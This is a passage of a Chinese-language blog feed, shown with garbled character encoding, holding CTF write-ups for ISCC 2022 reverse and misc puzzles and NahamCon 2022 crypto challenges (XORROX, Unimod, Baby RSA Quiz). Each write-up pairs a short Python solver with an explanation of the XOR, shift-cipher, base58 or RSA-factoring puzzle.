·å­stré•¿åº¦åº”è¯¥è¦ä¸º20ã€‚ç”±æ­¤å¾—åˆ°æˆ‘ä»¬è¿™ä¸ªå‡½æ•°æœŸæœ›è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚æ¥ä¸‹æ¥å†åå‘sub_4128A0å‡½æ•°å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>v9 = [<br>    <span class="hljs-number">149</span>, <span class="hljs-number">169</span>, <span class="hljs-number">137</span>, <span class="hljs-number">134</span>,<br>    <span class="hljs-number">212</span>, <span class="hljs-number">188</span>, <span class="hljs-number">177</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">177</span>, <span class="hljs-number">197</span>, <span class="hljs-number">192</span>, <span class="hljs-number">179</span>,<br>    <span class="hljs-number">153</span>, <span class="hljs-number">197</span>, <span class="hljs-number">159</span>, <span class="hljs-number">163</span>,<br>    <span class="hljs-number">160</span>, <span class="hljs-number">167</span>, <span class="hljs-number">169</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br>v6 = <span class="hljs-string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span><br><br>inputStr = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v6)):<br>    inputStr.append(v9[i] - <span class="hljs-built_in">ord</span>(v6[i]))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inputStr)):<br>    inputStr[i] ^= i<br><br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> inputStr])<br><br><span class="hljs-comment"># ISCC&#123;reverse_pHPHOp&#125;</span><br></code></pre></td></tr></table></figure><h2 id="getthetable"><a class="markdownIt-Anchor" href="#getthetable"></a> GetTheTable</h2><div class="note note-info">            <p>äº2022-05-11æ–°å¢</p>          </div><p>ä¸‹è½½é™„ä»¶IDAæ‰“å¼€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">n1 = <span class="hljs-number">18</span>;<br>  <span class="hljs-built_in">strcpy</span>(str, <span class="hljs-string">&quot;ERaQux2uV3u5F736EjkECSDVLp&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, plainText);<br>  n = <span class="hljs-built_in">strlen</span>(plainText);<br>  <span class="hljs-keyword">if</span> ( n &lt;= <span class="hljs-number">32</span> )<br>  &#123;<br>    *(_QWORD *)&amp;len[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>i64;<br>    *(_QWORD *)len = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">138</span> * <span class="hljs-built_in">strlen</span>(plainText) / <span class="hljs-number">0x64</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">strcpy</span>(str12581, <span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);<br>    encryption = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(*(<span class="hljs-type">int</span> *)len);<br>    index = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>æ˜¯base58åŠ å¯†ã€‚stråº”è¯¥å°±æ˜¯æˆ‘ä»¬åŠ å¯†è¿‡åçš„å­—ç¬¦ä¸²ã€‚æŠŠå­—ç¬¦ä¸²æ‹¿å‡ºæ¥è¿›è¡Œbase58è§£å¯†å³å¯å¾—åˆ°flagã€‚</p><h1 id="æœªå®Œæˆ"><a class="markdownIt-Anchor" href="#æœªå®Œæˆ"></a> æœªå®Œæˆ</h1><h2 id="è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—-2"><a class="markdownIt-Anchor" href="#è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—-2"></a> è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—-2</h2><div class="note note-info">            <p>äº2022-05-12æ–°å¢</p>          </div><p>ä¸‹è½½é™„ä»¶ï¼Œé‡Œé¢å°±ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\ğŸŒŸğŸŒ ğŸŒ âœ´ğŸŸ‰\ğŸŒŸğŸŒ ğŸŒ â˜…â£\ğŸŒŸğŸŒ ğŸŒ âœ´â£\ğŸŒŸğŸŒ ğŸŒ âœ´â£\ğŸŒŸğŸŒ ğŸŒ âœ§â‰›\ğŸŒŸğŸŒ ğŸŒ âœ§ğŸŸ‰\ğŸŒŸğŸŒ ğŸŒ âœ´ğŸŸ‰\ğŸŒŸğŸŒ ğŸŒ âœ´ğŸŸŒ\ğŸŒŸğŸŒ ğŸŒ âœ§âœ§\ğŸŒŸğŸŒ ğŸŒ âœ²â‰›\ğŸŒŸğŸŒ ğŸŒ â˜†ğŸŸŒ\ğŸŒŸğŸŒ ğŸŒ âœ§âœ¡\ğŸŒŸğŸŒ ğŸŒ â˜†ğŸŸŒ\ğŸŒŸğŸŒ ğŸŒ â˜…âœ§\ğŸŒŸğŸŒ ğŸŒ â£âœ¸\ğŸŒŸğŸŒ ğŸŒ âœ´â£\ğŸŒŸğŸŒ ğŸŒ âœ§ğŸŸ‰\ğŸŒŸğŸŒ ğŸŒ âœ´âœ¡\ğŸŒŸğŸŒ ğŸŒ â˜…â˜…\ğŸŒŸğŸŒ ğŸŒ âœ§âš</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ–œæ ã€‚è¿™ä¸ªåº”è¯¥æ˜¯unicodeã€‚Unicodeæœ‰å¥½å‡ ç§åˆ†éš”ç¬¦ï¼Œä½¿ç”¨\å¼€å¤´çš„æœ‰\uå’Œ\u+ï¼Œè¿™ä¸ªçœ‹æ ·å­æ˜¯\uã€‚æ‰€ä»¥ğŸŒŸå¯ä»¥æ›¿æ¢ä½uã€‚è§‚å¯Ÿåˆ°æ¯ä¸ªunicodeå‰é¢éƒ½æœ‰ğŸŒ ğŸŒ ï¼Œè€Œè‹±æ–‡å­—ç¬¦çš„unicodeå‰é¢éƒ½æ˜¯00ã€‚çŒœæµ‹è¿™ä¸ªæ›¿æ¢äº†00ï¼Œæ‰€ä»¥å°†å…¶æ›¿æ¢å›å»ã€‚</p><p>è¿™é‡ŒçŒœæµ‹å‰äº”ä¸ªå­—ç¬¦æ˜¯â€œISCC{â€è€Œæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯&quot;}&quot;ã€‚å¯ä»¥å¾—åˆ°å¯¹åº”çš„Unicodeç¼–ç ã€‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ISCC&#123;<br><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u007b</span><br>&#125;<br><span class="hljs-symbol">\u007d</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å‰é¢å…¶å®å¯ä»¥å¯¹ä¸Šçš„ã€‚ä½ çœ‹æ–‡ä»¶ä¸­ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªç¼–ç ï¼Œæ˜¯ä¸€æ ·çš„ã€‚å¾ˆæœ‰å¯èƒ½å°±æ˜¯æˆ‘ä»¬çŒœæµ‹çš„æ ·å­ã€‚å¾—åˆ°ç¼–ç åå¯¹åº”æ›¿æ¢ã€‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u007b</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u0049</span>\u004ğŸŸŒ<span class="hljs-symbol">\u0077</span>\u00âœ²b\u00â˜†ğŸŸŒ\u007âœ¡\u00â˜†ğŸŸŒ<span class="hljs-symbol">\u0057</span>\u003âœ¸<span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0079</span>\u004âœ¡<span class="hljs-symbol">\u0055</span><span class="hljs-symbol">\u007d</span><br></code></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°è¿™ä¸ªã€‚è¿™é‡Œé¢æœ€åè¿˜æœ‰å‡ ä¸ªå­—ç¬¦ä¸çŸ¥é“ã€‚çœ‹çœ‹èƒ½ä¸èƒ½å†æ‰¾å‡ºå‡ ä¸ªæ›¿ä»£ã€‚</p><p>å¯¹äºå½“å‰çš„åå…­è¿›åˆ¶æˆ‘ä»¬å·²ç»æœ‰äº†[0,3,4,5,7,9,b,d],é‚£ä¹ˆè¿˜å‰©ä¸‹[1,2,6,8,a,c,e,f]ã€‚</p><p>å¯¹äº\u00âœ²b</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">\u002b: +<br>\u006b: <span class="hljs-type">k</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥åº”è¯¥æ˜¯6ã€‚</p><p>å¯¹äº\u007âœ¡ï¼Œå¯é€‰çš„åªæœ‰[1,2,8,a,c,e,f]</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\u0071</span>:q<br><span class="hljs-string">\u0072</span>:r<br><span class="hljs-string">\u0078</span>:x<br><span class="hljs-string">\u007a</span>:z<br><span class="hljs-string">\u007c</span>:|<br><span class="hljs-string">\u007e</span>:~<br><span class="hljs-string">\u007f</span>:ä¸å¯è§<br></code></pre></td></tr></table></figure><p>c,e,fè¢«æ’é™¤ã€‚å½“å‰å¯é€‰1ï¼Œ2ï¼Œ8ï¼Œa</p><p>å¯¹äº\u003âœ¸ï¼Œå¯é€‰[1,2,8,a,c,e,f]</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\u0031</span>:<span class="hljs-number">1</span><br><span class="hljs-string">\u0032</span>:<span class="hljs-number">2</span><br><span class="hljs-string">\u0038</span>:<span class="hljs-number">8</span><br><span class="hljs-string">\u003a</span>::<br><span class="hljs-string">\u003c</span>:&lt;<br><span class="hljs-string">\u003e</span>:&gt;<br><span class="hljs-string">\u003f</span>:?<br></code></pre></td></tr></table></figure><p>å¯é€‰1ï¼Œ2ï¼Œ8</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NahamCon2022</title>
    <link href="/2022/05/01/NahamCon2022/"/>
    <url>/2022/05/01/NahamCon2022/</url>
    
    <content type="html"><![CDATA[<p>NahamCon CTF 2022 ä¸­ XORROXã€Unimodã€Baby RSA Quiz å’Œ Ostrich çš„é¢˜è§£ã€‚</p><span id="more"></span><p>ä»Šå¤©ç©äº†ç©NahamCon CTF 2022ï¼Œå‡Œæ™¨ä¸‰ç‚¹å¼€å§‹æ¯”èµ›ã€‚å½“ç„¶ï¼Œæˆ‘è‚¯å®šæ˜¯ç¡è§‰èµ·åºŠäº†å†æ‰“ã€‚</p><p>èµ·åºŠä¹‹åé˜Ÿå‹æŠŠçƒ­èº«é¢˜å…¨æ‰«äº†ï¼Œæˆ‘ä¹Ÿæ²¡å•¥é¢˜å¯ä»¥åšäº†ï¼ˆèœé¸¡ä¸€ä¸ªã€‚åé¢æ‰¾äº†ä»¥ä¸‹éš¾åº¦ä¸å¤§çš„cryptoå†™ã€‚ä»¥ä¸‹æ˜¯writeupã€‚åé¢æˆ‘è¿˜ä¼šå†™ä¸€ä¸‹åˆ«äººçš„writeupï¼Œå› ä¸ºæœ‰äº›é¢˜æ²¡å†™å‡ºæ¥ã€‚</p><h1 id="xorrox"><a class="markdownIt-Anchor" href="#xorrox"></a> XORROX</h1><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    flag = filp.read().strip()<br><br>key = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]<br><br>xorrox = []<br>enc = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br>    enc.append(flag[i] ^ v)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;xorrox=&#125;</span>\n&quot;</span>)<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;enc=&#125;</span>\n&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªç®€å•çš„å¤šæ¬¡å¼‚æˆ–ã€‚å¼‚æˆ–æ˜¯å¯é€†çš„ï¼Œè€Œä¸”æˆ‘ä»¬çš„keyå…ƒç´ ä¸­çš„ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯key[0]æ˜¯ä¸ä¼šè¢«ä¿®æ”¹çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å†è·‘ä¸€ä¸‹è¿™ä¸ªå¾ªç¯ï¼ŒæŠŠkeyè·‘å‡ºæ¥å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>xorrox=[<span class="hljs-number">1</span>, <span class="hljs-number">209</span>, <span class="hljs-number">108</span>, <span class="hljs-number">239</span>, <span class="hljs-number">4</span>, <span class="hljs-number">55</span>, <span class="hljs-number">34</span>, <span class="hljs-number">174</span>, <span class="hljs-number">79</span>, <span class="hljs-number">117</span>, <span class="hljs-number">8</span>, <span class="hljs-number">222</span>, <span class="hljs-number">123</span>, <span class="hljs-number">99</span>, <span class="hljs-number">184</span>, <span class="hljs-number">202</span>, <span class="hljs-number">95</span>, <span class="hljs-number">255</span>, <span class="hljs-number">175</span>, <span class="hljs-number">138</span>, <span class="hljs-number">150</span>, <span class="hljs-number">28</span>, <span class="hljs-number">183</span>, <span class="hljs-number">6</span>, <span class="hljs-number">168</span>, <span class="hljs-number">43</span>, <span class="hljs-number">205</span>, <span class="hljs-number">105</span>, <span class="hljs-number">92</span>, <span class="hljs-number">250</span>, <span class="hljs-number">28</span>, <span class="hljs-number">80</span>, <span class="hljs-number">31</span>, <span class="hljs-number">201</span>, <span class="hljs-number">46</span>, <span class="hljs-number">20</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>]<br>enc=[<span class="hljs-number">26</span>, <span class="hljs-number">188</span>, <span class="hljs-number">220</span>, <span class="hljs-number">228</span>, <span class="hljs-number">144</span>, <span class="hljs-number">1</span>, <span class="hljs-number">36</span>, <span class="hljs-number">185</span>, <span class="hljs-number">214</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">178</span>, <span class="hljs-number">145</span>, <span class="hljs-number">47</span>, <span class="hljs-number">237</span>, <span class="hljs-number">70</span>, <span class="hljs-number">244</span>, <span class="hljs-number">149</span>, <span class="hljs-number">98</span>, <span class="hljs-number">20</span>, <span class="hljs-number">46</span>, <span class="hljs-number">187</span>, <span class="hljs-number">207</span>, <span class="hljs-number">136</span>, <span class="hljs-number">154</span>, <span class="hljs-number">231</span>, <span class="hljs-number">131</span>, <span class="hljs-number">193</span>, <span class="hljs-number">84</span>, <span class="hljs-number">148</span>, <span class="hljs-number">212</span>, <span class="hljs-number">126</span>, <span class="hljs-number">126</span>, <span class="hljs-number">226</span>, <span class="hljs-number">211</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">119</span>]<br>key = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(xorrox):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= xorrox[j]<br>    xorrox[i] = k<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]^k), end=<span class="hljs-string">&quot;&quot;</span>)<br>    key.append(k)<br><span class="hljs-built_in">print</span>(key, <span class="hljs-built_in">len</span>(key))<br><br>    <br>xorrox = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br><span class="hljs-built_in">print</span>(xorrox)<br></code></pre></td></tr></table></figure><h1 id="unimod"><a class="markdownIt-Anchor" href="#unimod"></a> Unimod</h1><p>è¿™é¢˜æœ‰ç‚¹è›‹ç–¼ã€‚å› ä¸ºç›´æ¥çœ‹æ•°æ®æ–‡ä»¶æ ¼å¼æœ‰ç‚¹ä¸å¯¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>ct = <span class="hljs-string">&#x27;&#x27;</span><br>k = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">0xFFFD</span>)<br><span class="hljs-comment"># k = 15449</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag:<br>    <br>    ct += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) + k) % <span class="hljs-number">0xFFFD</span>)<br>    <br>    <span class="hljs-comment"># a = chr((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print(libnum.s2n(chr((ord(c) + k) % 0xFFFD)))</span><br>    <span class="hljs-comment"># print(ord(a))</span><br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(ct.encode())<br><br></code></pre></td></tr></table></figure><p>æ³¨é‡Šéƒ¨åˆ†æ˜¯æˆ‘æµ‹è¯•çš„éƒ¨åˆ†ã€‚åŸé¢˜ç›®æ˜¯æ²¡æœ‰çš„ã€‚</p><p>ä»¥ä¸‹æ˜¯åŸé¢˜ç›®çš„åå…­è¿›åˆ¶æ•°æ®ã€‚å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„ä¸‰ä¸ªå­—èŠ‚ä¸€ä¸ªåˆ†ç»„ã€‚ä½†æ˜¯ä»ä»£ç ä¸Šçœ‹ï¼Œæˆ‘ä»¬çš„åˆ°çš„æ•°æ®åº”è¯¥æ˜¯ä¸¤ä¸ªå­—èŠ‚ä¸€ä¸ªåˆ†ç»„ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E9</span> A5 <span class="hljs-number">87</span> E9 A5 <span class="hljs-number">8</span>D E9 A5 <span class="hljs-number">82</span> E9 A5 <span class="hljs-number">88</span> E9 A5 <span class="hljs-number">9</span>C E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">99</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">97</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">83</span> E9 A5 <span class="hljs-number">84</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">86</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">96</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">9</span>A E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">94</span> E9 A4 <span class="hljs-number">95</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">99</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">9</span>E E9 A3 AB<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ‰äº†æ³¨é‡Šä¸­çš„ä¸‰æ¡è¾“å‡ºè¯­å¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">15565<br>14922637<br>15565<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæ•°æ®ç»è¿‡ç¼–ç æˆäº†ä¸‰ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¯»æ–‡ä»¶ï¼Œç„¶åç”¨ä¸‰ä¸ªå­—èŠ‚åˆ†ç»„ï¼Œä½¿ç”¨<strong>ord</strong>å‡½æ•°æ¥è§£ç ï¼Œæ‰èƒ½å¾—åˆ°æ­£ç¡®çš„å€¼ã€‚</p><p>è¿™é‡Œå…¶å®æœ‰ä¸ªkï¼Œä½†æ˜¯å½±å“ä¸å¤§ã€‚è¿™é‡Œ0xFFFDå…¶å®æ¯”æˆ‘ä»¬ASCIIç çš„èŒƒå›´å¤§äº†å¤ªå¤šã€‚åŸºæœ¬ä¸Šä¸ä¼šå‡ºç°å–çš„kåˆšå¥½åœ¨0xFFFDçš„è¾¹ç•Œä¸Šã€‚æ‰€ä»¥ç›´æ¥è§£å°±è¡Œäº†ï¼Œå¦‚æœä¸è¡Œé‚£ä¹Ÿå°±å†åŠ ä¸ª0xFFFDè¿›è¡Œå¤„ç†å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;out&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br><span class="hljs-comment"># åæ­£æŒºå‘çš„ï¼Œä¸€ä¸ª2å­—èŠ‚çš„æ•°æ®äºŒè¿›åˆ¶å†™å…¥æˆäº†3å­—èŠ‚ï¼Œè¿™é‡Œç›´æ¥ä¸‰å­—èŠ‚åˆ†ç‰‡ç„¶åç”¨ordå–ä»–çš„æ•°å­—å°±è¡Œ</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">3</span>):<br>    a = data[i:i+<span class="hljs-number">3</span>].decode()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) - <span class="hljs-number">39137</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># é€šè¿‡çŒœæµ‹ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯&#x27;f&#x27;ï¼Œ æ¥è®¡ç®—k = 39137</span><br></code></pre></td></tr></table></figure><h1 id="baby-rsa-quiz"><a class="markdownIt-Anchor" href="#baby-rsa-quiz"></a> Baby RSA Quiz</h1><p>è¿™é¢˜æ²¡æœ‰ç»™æ–‡ä»¶è€Œæ˜¯ä»¥sshçš„æ–¹å¼è¿›è¡Œçš„ã€‚</p><p>ä¸€å…±ä¸‰å°é¢˜ï¼Œç¬¬ä¸€å°é¢˜ç»™çš„æ˜¯ä¸ªå°nï¼Œç›´æ¥åˆ†è§£å°±è¡Œäº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 1: |<br> ---------<br>n = 115398298544369<br>e = 65537<br>ct = 37386859625793<br><br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥ä¸Šç½‘ç«™ä¸€åˆ†è§£å°±è¡Œã€‚å¾—åˆ°pï¼Œqæ±‚è§£dï¼Œç„¶åç®—mã€‚è¿™é‡Œç­”æ¡ˆæ˜¯æ•´å‹çš„ï¼Œä½†å…¶å®ä¹Ÿæ˜¯èƒ½è½¬æˆå­—ç¬¦ä¸²çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"> 